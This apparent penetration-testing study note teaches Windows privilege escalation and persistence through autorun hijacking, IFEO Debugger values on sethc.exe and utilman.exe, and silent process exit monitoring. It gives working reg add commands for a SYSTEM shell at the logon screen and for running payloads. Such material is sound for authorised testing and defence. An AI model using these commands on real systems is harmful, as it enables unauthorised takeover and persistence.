---
created: 2026-08-26
updated: 2026-08-27
tags:
  - Windows
  - Windows_PrivEsc
status: incomplete
---
- Divide Autoruns and IFEO
- Fix in a way that does not duplicate info from [[Weak service permissions]] 
## Autoruns & IFEO debugger hijacking

>[!abstract] **Scope**: Local Windows privilege escalation and persistence via autorun location abuse and Image File Execution Options (IFEO) debugger hijacking.

- **Autoruns** are mechanisms in Windows (registry keys, startup directories, scheduled tasks, services) configured to launch programs automatically during system boot or user logon.
- **Image File Execution Options (IFEO)** is a Windows registry feature designed to attach debuggers to processes upon launch. When misconfigured or deliberately abused on accessibility binaries (`sethc.exe`, `utilman.exe`), IFEO allows spawning an interactive `NT AUTHORITY\SYSTEM` command shell directly from the logon screen without authentication.

---

- [ ] Enumerate system-wide autorun registry keys (`HKLM` and `HKCU`).
- [ ] Inspect system-wide and per-user startup folders for writable executables or shortcuts.
- [ ] Check file permissions on autorun binaries using `icacls` or `accesschk.exe`.
- [ ] Replace writable autorun binaries or modify autorun registry path entries.
- [ ] Inspect ACL permissions on the IFEO registry key `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`.
- [ ] Register a `Debugger` registry value for accessibility binaries (`sethc.exe` / `utilman.exe`) pointing to `cmd.exe`.
- [ ] Trigger execution via system reboot, user logon, or logon screen shortcuts (`Shift` five times or `Win + U`).
- [ ] Verify elevated execution (`whoami`) and restore original binary paths or registry settings.

---

## Foundational mechanics of autoruns

- Windows autoruns allow applications to start automatically without manual user invocation. They are primarily configured through specific registry keys and startup directories on the file system:
  - **Machine-wide autoruns (`HKLM`)**: Registry keys under `HKEY_LOCAL_MACHINE` and the global `C:\ProgramData\...\Startup` directory execute automatically for *every* user who logs on to the target system (including administrators).
  - **User-specific autoruns (`HKCU`)**: Registry keys under `HKEY_CURRENT_USER` and `%APPDATA%\...\Startup` execute only when that specific user logs on.

- **The privilege escalation vector**:
  - A security vulnerability exists when an autorun configured in a system-wide location (`HKLM` or `C:\ProgramData\...`) references a binary or executable path located in a folder where non-administrative users have write permissions (such as `C:\Tools\`, `C:\ProgramData\VendorApp\`, or subdirectories created with weak file ACLs).
  - An unprivileged user can replace the target binary with a custom executable payload. When an administrative user or `SYSTEM` process logs on, Windows executes the replaced binary under that privileged security context.

## Enumerating and exploiting autoruns

- Common autorun locations in Windows:

| Autorun location | Scope & execution context |
| :--- | :--- |
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | Executes automatically on every user logon across all accounts. |
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce` | Executes once on the next user logon across all accounts. |
| `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | Executes on logon for the specific current user context. |
| `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run` | 32-bit application autorun entries on 64-bit Windows installations. |
| `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup` | Global startup folder for all system users. |
| `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` | Per-user startup folder for the currently logged-in user. |

- Query system-wide autorun registry keys directly:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
```

- Enumerate startup commands through CIM/WMI:

```powershell
Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location, User | Format-Table -AutoSize
```

> [!example]-
> ```powershell
> PS C:\> Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location, User | Format-List
>
> Name     : SecurityHealth
> Command  : "C:\Program Files\Windows Defender\MSASCuL.exe"
> Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
> User     : Machine
> ```

- Inspect files in the global and per-user startup directories:

```powershell
Get-ChildItem "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

```powershell
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
```

- Audit permissions on autorun binaries using `icacls`:

```powershell
icacls "C:\Program Files\Vendor\AutorunApp.exe"
```

- Audit executable write permissions using `accesschk.exe`:

```powershell
accesschk.exe /accepteula -quvw "C:\Program Files\Vendor\AutorunApp.exe"
```

- Automatically audit modifiable autoruns using `SharpUp`:

```powershell
.\SharpUp.exe audit
```

> [!example]- `SharpUp` autorun audit output
> ```powershell
> PS C:\Tools> .\SharpUp.exe audit
>
> === Modifiable Registry Autoruns ===
>
>   HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
>     SecurityHealth : "C:\Program Files\Windows Defender\MSASCuL.exe"
>
>   [!] Modifiable autorun: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\cleanup.exe
> ```

- If you have write access to an autorun binary, replace it with your payload executable:

```powershell
copy /Y C:\Temp\adduser.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\cleanup.exe"
```

- If you have write access to an autorun registry key, reconfigure the value to execute your payload executable directly:

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v SecurityAgent /t REG_SZ /d "C:\Temp\payload.exe" /f
```

>[!tip]+
>- Verify payload execution after an administrative user logs on:
> ```powershell
> Get-Process payload
> ```

>[!tip]+ Cleanup
>- Restore the original autorun binary or registry value:
> ```powershell
> reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v SecurityAgent /t REG_SZ /d "C:\Program Files\Vendor\AutorunApp.exe" /f
> ```

## Foundational mechanics of Image File Execution Options (IFEO)

- Image File Execution Options (IFEO) is a developer-facing Windows registry mechanism stored at:
  - `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<ExecutableName>`

- **How IFEO process creation works**:
  1. When any application (e.g. `sethc.exe`) is launched, the Windows process creation routines (`CreateProcess`) query the registry subkey matching the target executable name under IFEO.
  2. If a `REG_SZ` string value named `Debugger` is present under that subkey, Windows stops spawning the original application directly.
  3. Instead, Windows launches the executable path specified in `Debugger`, passing the original executable name as a command-line parameter.

- **Why accessibility binaries on the lock screen are vulnerable**:
  - Windows provides accessibility features accessible on the logon screen prior to user authentication:
    - `sethc.exe` — Sticky Keys (triggered by pressing `Shift` five times).
    - `utilman.exe` — Utility Manager / Ease of Access (triggered by pressing `Win + U` or clicking the accessibility icon).
  - Because no user has authenticated yet, the Windows logon UI infrastructure runs under the `NT AUTHORITY\SYSTEM` security context.
  - If an administrator or misconfigured registry DACL allows setting a `Debugger` registry value for `sethc.exe` or `utilman.exe` pointing to `cmd.exe`, launching Sticky Keys or Utility Manager executes `cmd.exe` directly as `NT AUTHORITY\SYSTEM`.

## Exploiting IFEO debugger hijacking

- Check effective permissions on the IFEO registry path using `accesschk.exe`:

```powershell
accesschk.exe /accepteula -kvuqsw "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
```

- Register a `Debugger` value for Sticky Keys (`sethc.exe`) pointing to `cmd.exe`:

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "cmd.exe" /f
```

- Register a `Debugger` value for Utility Manager (`utilman.exe`) pointing to `cmd.exe`:

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "cmd.exe" /f
```

- Verify the `Debugger` registry entry configuration:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger
```

> [!example]-
> ```powershell
> PS C:\> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger
>
> HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe
>     Debugger    REG_SZ    cmd.exe
> ```

- Trigger execution at the Windows logon screen:
  - Press `Shift` five times to invoke `sethc.exe`.
  - Press `Win + U` or click the Accessibility icon to invoke `utilman.exe`.

>[!tip]+
>- Confirm `NT AUTHORITY\SYSTEM` context inside the spawned prompt:
> ```powershell
> whoami
> ```

>[!tip]+ Cleanup
>- Delete the `Debugger` registry value to restore normal accessibility functionality:
> ```powershell
> reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /f
> ```

## Exploiting silent process exit hijacking

- Windows process exit monitoring allows triggering a secondary process automatically whenever a target application terminates cleanly or crashes.
- Configuring `GlobalFlag` to `0x200` (`FLG_MONITOR_SILENT_PROCESS_EXIT`) under an executable's IFEO key enables process exit monitoring. Windows then checks `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\<ExecutableName>` for monitoring commands.

- Enable silent process exit monitoring for `notepad.exe`:

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
```

- Set `ReportingMode` to `1` (launch monitor process):

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1 /f
```

- Configure `MonitorProcess` with your payload executable path:

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d "C:\Temp\payload.exe" /f
```

>[!tip]+ Cleanup
>- Remove silent process exit monitoring registry entries:
> ```powershell
> reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /f
> ```
> ```powershell
> reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /f
> ```

## References and further reading

- [`Image File Execution Options — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/gflags-flag-table)
- [`Autoruns for Windows — Microsoft Sysinternals`](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns)
- [`Privilege Escalation with Autoruns — HackTricks`](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html)
- [`Persistence via IFEO Debugger — MITRE ATT&CK`](https://attack.mitre.org/techniques/T1546/012/)
